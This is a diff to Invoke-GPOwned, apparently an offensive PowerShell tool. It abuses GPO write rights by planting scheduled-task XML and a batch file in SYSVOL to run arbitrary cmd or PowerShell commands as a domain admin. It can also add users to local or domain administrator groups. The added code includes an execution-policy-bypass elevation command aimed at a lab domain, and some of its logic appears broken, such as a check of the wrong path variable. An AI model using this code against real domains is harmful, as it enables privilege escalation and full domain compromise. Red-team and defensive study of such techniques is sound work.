@@ -41,11 +41,15 @@ function Invoke-GPOwned {
 
         [Parameter(Mandatory=$false)]
         [Alias("cc")]
-        [string]$CustomCommand,
+        [string]$CMD,
         
         [Parameter(Mandatory=$false)]
-        [Alias("ccp")]
-        [string]$PowerShellCustomCommand
+        [Alias("pcc")]
+        [string]$PowerShell,
+
+        [Parameter(Mandatory=$false)]
+        [Alias("stx")]
+        [string]$SecondTaskXMLPath
     )
 
     if ($Help -or !($GPOGUID) -or !($ScheduledTasksXMLPath) -or !($Computer)) {
@@ -60,7 +64,7 @@ Parameters:
 -Computer: Target computer
 -Local: - adds a chosen user to the local administrators goup on the defined computer
 -DA: adds the user to the domain admins group
--CustomCommand:
+-CMD:
 -User: Target user to elevate, mandatory for Local technique
 -Domain: Target domain
 -LoadDLL: Load the Microsoft.ActiveDirectory.Management.dll from a custom path, if not supplied it will try to download it to the current directory
@@ -120,7 +124,11 @@ if(!($LoadDLL)){
     }
 
     # Look for an active domain admin account #
-    if(!($TargetUser)){
+    if($Author){
+        echo $Author
+        $dauser = $Author
+        echo $dauser
+    } else {
         $i = 0
         while($gotcha -ne "1"){
             $dauser = (Get-ADGroupMember "Domain Admins" | Select-Object SamAccountName -ExpandProperty SamAccountName)[$i]
@@ -142,6 +150,28 @@ if(!($LoadDLL)){
         Write-Output "[-] XML file empty or corrupted!."
         exit(0)
     }
+    if($SecondTaskXMLPath){
+        $validatesecondxml = Get-Content $SecondTaskXMLPath
+    if(-not(Test-Path $ScheduledTasksXMLPath)){
+        Write-Output "[-] XML file not found!."
+        break
+    }
+    elseif($validatesecondxml.StartsWith("<?xml version")){
+        Write-Output "[+] XML File is valid!."
+        $cont = "powershell -NoProfile -ExecutionPolicy Bypass -Command `"Start-Process powershell -Verb RunAs -ArgumentList `"(`$Task=Get-Content '\\dc-01.noteasy.local\sysvol\noteasy.local\Policies\{D552AC5B-CE07-4859-9B8D-1B6A6BE1ACDA}\Machine\Preferences\ScheduledTasks\wsadd.xml' -raw); Register-ScheduledTask -Xml `$Task -TaskName OWNED2`""
+        Set-Content -Path .\add.bat -Value $cont
+        New-Item -ItemType File -Path "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\wsadd.xml" -Force 2>&1>$null
+        Copy-Item $SecondTaskXMLPath "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\wsadd.xml" -Force 2>&1>$null
+        Copy-Item add.bat "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\add.bat" -Force 2>&1>$null
+        Write-Output "[+] Created wsadd.xml and add.bat files in SYSVOL!"
+        }
+
+
+    }else{
+        Write-Output "[-] XML file empty or corrupted!."
+        exit(0)
+    }
+    
     # Checking whether a ScheduledTasks.xml file exists in SYSVOL for the means of backup and restoration after execution #
     if(Get-Content "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" -ErrorAction SilentlyContinue){
         Copy-Item "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml.old"
@@ -196,58 +226,63 @@ if(!($LoadDLL)){
         $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","$localcommand"} |
                     Set-Content -Encoding $encoding $xmlfile -Force
         Write-Output "[+] ScheduledTasks file modified to add $User to local administrators group on $Computer!"
-    } elseif($CustomCommand){
-        if(($CustomCommand.StartSwith("/c "))){
-            $CustomCommand = $CustomCommand.replace("/c ","")
-        } elseif(($CustomCommand.StartSwith("/r "))){
-            $CustomCommand = $CustomCommand.replace("/r ","")
-        }
-        $pwd = (Get-Location | Select-Object Path -ExpandProperty Path)
-        $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
-        $encoding = 'ASCII'
-        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
-        $xmlfilecontent | ForEach-Object {$_ -replace "changedomain","$domain"} |
-                    Set-Content -Encoding $encoding $xmlfile -Force
-        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
-        $xmlfilecontent | ForEach-Object {$_ -replace "changeuser","$dauser"} |
-                    Set-Content -Encoding $encoding $xmlfile -Force
-        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
-        $xmlfilecontent | ForEach-Object {$_ -replace "ownuser","$User"} |
-                    Set-Content -Encoding $encoding $xmlfile -Force
-        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
-        $xmlfilecontent | ForEach-Object {$_ -replace "changedc","$dc"} |
-                    Set-Content -Encoding $encoding $xmlfile -Force
-        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
-        $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","/r $CustomCommand"} |
-                    Set-Content -Encoding $encoding $xmlfile -Force
-        Write-Output "[+] ScheduledTasks file modified with the supplied custom command!."
-    } elseif($PowerShellCustomCommand){
-        if(($PowerShellCustomCommand.StartSwith("-c "))){
-            $PowerShellCustomCommand = $PowerShellCustomCommand.replace("-c ","")
-        } elseif(($PowerShellCustomCommand.StartSwith("-Command "))){
-            $PowerShellCustomCommand = $PowerShellCustomCommand.replace("-Command ","")
-        }
-        $pwd = (Get-Location | Select-Object Path -ExpandProperty Path)
-        $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
-        $encoding = 'ASCII'
-        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
-        $xmlfilecontent | ForEach-Object {$_ -replace "changedomain","$domain"} |
-                    Set-Content -Encoding $encoding $xmlfile -Force
-        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
-        $xmlfilecontent | ForEach-Object {$_ -replace "changeuser","$dauser"} |
-                    Set-Content -Encoding $encoding $xmlfile -Force
-        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
-        $xmlfilecontent | ForEach-Object {$_ -replace "ownuser","$User"} |
-                    Set-Content -Encoding $encoding $xmlfile -Force
-        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
-        $xmlfilecontent | ForEach-Object {$_ -replace "changedc","$dc"} |
-                    Set-Content -Encoding $encoding $xmlfile -Force
-        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
-        $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","-Command $PowerShellCustomCommand"} |
-                    Set-Content -Encoding $encoding $xmlfile -Force
-        Write-Output "[+] ScheduledTasks file modified with the supplied custom command!."
     } else {
-        Write-Output "[-] Either the -Local/-DA/-CustomCommand/-PowerShellCustomCommand flags are required for execution!."
+        if($PowerShell){
+            if(($PowerShell.StartSwith("-c "))){
+                $PowerShell = $PowerShell.replace("-c ","")
+            } elseif(($PowerShell.StartSwith("-Command "))){
+                $PowerShell = $PowerShell.replace("-Command ","")
+        }
+        $pwd = (Get-Location | Select-Object Path -ExpandProperty Path)
+        $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
+        $encoding = 'ASCII'
+        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+        $xmlfilecontent | ForEach-Object {$_ -replace "changedomain","$domain"} |
+                    Set-Content -Encoding $encoding $xmlfile -Force
+        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+        $xmlfilecontent | ForEach-Object {$_ -replace "changeuser","$dauser"} |
+                    Set-Content -Encoding $encoding $xmlfile -Force
+        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+        $xmlfilecontent | ForEach-Object {$_ -replace "ownuser","$User"} |
+                    Set-Content -Encoding $encoding $xmlfile -Force
+        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+        $xmlfilecontent | ForEach-Object {$_ -replace "changedc","$dc"} |
+                    Set-Content -Encoding $encoding $xmlfile -Force
+        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+        $xmlfilecontent | ForEach-Object {$_ -replace "cmd.exe","powershell.exe"} |
+                    Set-Content -Encoding $encoding $xmlfile -Force
+        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+        $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","-Command $PowerShell"} |
+                    Set-Content -Encoding $encoding $xmlfile -Force
+        Write-Output "[+] ScheduledTasks file modified with the supplied powershell custom command!."
+    } if($CMD){
+        if(($CMD.StartSwith("/c "))){
+            $CMD = $CMD.replace("/c ","")
+        } elseif(($CMD.StartSwith("/r "))){
+            $CMD = $CMD.replace("/r ","")
+        }
+        $pwd = (Get-Location | Select-Object Path -ExpandProperty Path)
+        $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
+        $encoding = 'ASCII'
+        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+        $xmlfilecontent | ForEach-Object {$_ -replace "changedomain","$domain"} |
+                    Set-Content -Encoding $encoding $xmlfile -Force
+        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+        $xmlfilecontent | ForEach-Object {$_ -replace "changeuser","$dauser"} |
+                    Set-Content -Encoding $encoding $xmlfile -Force
+        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+        $xmlfilecontent | ForEach-Object {$_ -replace "ownuser","$User"} |
+                    Set-Content -Encoding $encoding $xmlfile -Force
+        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+        $xmlfilecontent | ForEach-Object {$_ -replace "changedc","$dc"} |
+                    Set-Content -Encoding $encoding $xmlfile -Force
+        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
+        $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","/r $CMD"} |
+                    Set-Content -Encoding $encoding $xmlfile -Force
+        Write-Output "[+] ScheduledTasks file modified with the supplied custom command!."
+ 
+    } if(!$CMD -and !$PowerShell) {
+        Write-Output "[-] Either the -Local/-DA/-CMD/-PowerShell flags are required for execution!."
         return
     }
     
@@ -321,7 +356,7 @@ if(!($LoadDLL)){
             Start-Sleep 1
             }
         Write-Output "[+] User added to the local admins group!"
-     }elseif($CustomCommand){
+     }elseif($CMD -or $PowerShell){
         for ($x = 1; $x -le 300; $x++ ){
             $PercentCompleted = ($x/300*100)
             Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
@@ -358,4 +393,5 @@ if(!($LoadDLL)){
     } else {
         Write-Output "[+] File removed from SYSVOL"
     }
+}
 }
